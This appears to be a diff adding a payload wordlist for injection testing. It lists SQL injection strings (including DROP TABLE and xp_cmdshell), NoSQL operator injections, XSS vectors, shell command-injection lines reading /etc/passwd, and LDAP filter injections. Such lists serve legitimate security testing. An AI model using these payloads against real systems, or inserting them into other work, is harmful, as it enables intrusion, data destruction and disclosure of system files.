@@ -1,0 +1,65 @@
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+'; DROP TABLE users--
+' UNION SELECT 1,2,3--
+admin'--
+admin'/*
+' OR 'a'='a
+') OR ('1'='1
+' OR 1=1 LIMIT 1--
+1' OR '1'='1
+' AND 1=1--
+' AND 1=2--
+1' AND '1'='2
+' waitfor delay '00:00:05'--
+'; EXEC xp_cmdshell('dir')--
+' OR SLEEP(5)--
+1'; WAITFOR DELAY '00:00:05'--
+
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$regex": ".*"}
+true, true
+', '1', '1
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"$where": "this.username == this.password"}
+{$func: "var_dump"}
+
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+
+eval('alert("XSS")')
+Function('alert("XSS")')()
+setTimeout('alert("XSS")',1)
+setInterval('alert("XSS")',1)
+document.write('<script>alert("XSS")</script>')
+window.location='javascript:alert("XSS")'
+
+; ls -la
+| cat /etc/passwd
+& dir
+&& whoami
+; cat /etc/hosts
+`whoami`
+$(whoami)
+${PATH}
+;cat /etc/passwd;
+|cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+
+*)(uid=*))(|(uid=*
+*)(|(password=*))
+)(cn=*))(|(cn=*
